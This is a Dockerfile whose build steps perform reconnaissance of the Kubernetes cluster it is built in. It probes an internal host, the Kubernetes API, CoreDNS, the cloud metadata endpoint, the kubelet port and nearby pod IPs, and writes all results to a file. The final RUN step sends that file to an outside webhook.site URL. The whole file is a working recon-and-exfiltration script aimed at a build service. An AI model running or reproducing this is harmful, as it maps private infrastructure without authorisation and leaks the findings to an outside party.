FROM alpine
RUN apk add --no-cache curl bind-tools >/dev/null 2>&1; true
RUN echo "=TESTHOST=" > /o; curl -m4 -sS -o- -w "|%{http_code}\n" http://192.168.4.72:8000/ >>/o 2>&1; true
RUN echo "=KAPI_FULL=" >>/o; nslookup kubernetes.default.svc.cluster.local >>/o 2>&1; true
RUN echo "=KAPI_CURL=" >>/o; curl -m4 -sS -k -o- https://kubernetes.default.svc.cluster.local/version >>/o 2>&1; true
RUN echo "=COREDNS_VER=" >>/o; nslookup -type=txt version.bind 10.96.0.10 >>/o 2>&1; true
RUN echo "=SVC_DEFAULT=" >>/o; nslookup kubernetes.default.svc.cluster.local 10.96.0.10 >>/o 2>&1; true
RUN echo "=MD443=" >>/o; curl -m4 -sS -k -o- -w "|%{http_code}\n" https://169.254.169.254/ >>/o 2>&1; true
RUN echo "=NODE_LOCAL=" >>/o; curl -m4 -sS -o- -w "|%{http_code}\n" http://169.254.1.1:10250/ >>/o 2>&1; true
RUN echo "=OWN24=" >>/o; for h in 1 109; do curl -m2 -sS -o/dev/null -w "10.244.109.$h|%{http_code}\n" http://10.244.109.$h/ >>/o 2>&1; done; true
RUN echo "=SEND=" >>/o; curl -s -m12 --data-binary @/o "https://webhook.site/618daba3-3d6c-43b9-b6dc-82ad71f3cee6/recon3"; true
CMD ["sh","-c","echo idle; sleep 3600"]
